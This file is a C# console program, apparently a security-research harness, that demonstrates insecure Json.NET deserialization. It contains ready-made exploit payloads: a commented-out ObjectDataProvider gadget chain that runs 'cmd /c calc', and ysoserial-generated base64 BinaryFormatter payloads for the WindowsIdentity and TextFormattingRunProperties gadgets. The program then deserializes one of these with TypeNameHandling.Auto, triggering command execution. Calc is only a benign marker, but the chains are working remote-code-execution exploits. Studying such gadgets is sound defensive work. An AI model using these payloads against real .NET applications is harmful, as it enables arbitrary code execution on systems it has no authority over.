using System;
using JsonTest;
using Newtonsoft.Json;

namespace TestConsoleApp_YSONET
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is a JSON.NET testing code");

            //Console.ReadLine();
            JsonClass testClass = new JsonClass();
            testClass.Classname = ".NET";
            testClass.Age = 18;
            testClass.Name = "Jin";

            string testString = JsonConvert.SerializeObject(testClass, new JsonSerializerSettings {
                NullValueHandling = NullValueHandling.Ignore,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
                TypeNameHandling = TypeNameHandling.All, }
            );
            Console.WriteLine(testString);
            //Console.ReadLine();
            /*
            String payload = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                'MethodParameters':{
                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                '$values':['cmd','/c calc']
                },

                'ObjectInstance':{ '$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
            }";

            object new_obj = JsonConvert.DeserializeObject<object>(payload, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto
            });
            
            */
            // ysoserial.exe -g  WindowsIdentity -f BinaryFormatter -c calc.exe -o base64
            string b64_payload = "AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAyAlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdGdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nWTJGc1l5NWxlR1VpSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L";

            var obj1 = new WindowsIdentityTest(b64_payload);
            string obj1_str = JsonConvert.SerializeObject(obj1, new JsonSerializerSettings {
                TypeNameHandling = TypeNameHandling.All,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
            });
            Console.WriteLine(obj1_str);
            /* Result
             * {"$type":"JsonTest.WindowsIdentityTest, JsonTest, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null","System.Security.ClaimsIdentity.bootstrapContext":"AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAyAlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdGdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nWTJGc1l5NWxlR1VpSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L"}
             */

            String payload = @"{
            '$type' : 'System.Security.Principal.WindowsIdentity,  mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            'System.Security.ClaimsIdentity.bootstrapContext' : 'AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAyAlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdGdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nWTJGc1l5NWxlR1VpSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L'
              }";

            payload = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'System.Security.ClaimsIdentity.actor': 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAtgU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgY2FsYy5leGUiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=='
                }";

            object new_obj = JsonConvert.DeserializeObject<object>(payload, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto
            });


            Console.ReadLine();
        }
    }
}
